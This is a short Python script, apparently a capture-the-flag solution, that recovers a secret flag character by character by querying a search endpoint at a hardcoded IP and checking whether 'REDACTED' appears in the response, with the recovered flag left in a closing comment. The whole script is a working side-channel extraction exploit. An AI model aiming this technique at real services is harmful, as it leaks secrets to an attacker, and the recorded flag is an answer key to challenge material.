import httpx
import asyncio
import string
from aiolimiter import AsyncLimiter


async def check(client: httpx.AsyncClient, key):
    resp = await client.get("http://137.184.207.224:1003/search", params={"key": key})
    return "REDACTED" in resp.text



async def limited_gather(limiter, *tasks):
    async def wrapper(task):
        async with limiter:
            return await task

    return await asyncio.gather(*(wrapper(task) for task in tasks))


async def main():
    async with httpx.AsyncClient() as client:
        limiter = AsyncLimiter(5, 1.5)
        charset = "{_}" + string.ascii_lowercase + string.digits
        flag = "ictf{"
        while not flag.endswith("}"):
            cands = [flag + c for c in charset]
            results = await limited_gather(limiter, *[check(client, c) for c in cands])
            for f, r in zip(cands, results):
                if r:
                    flag = f
            print(flag)


asyncio.run(main())
# ictf{correcthorsebatterystaplenohackpls}
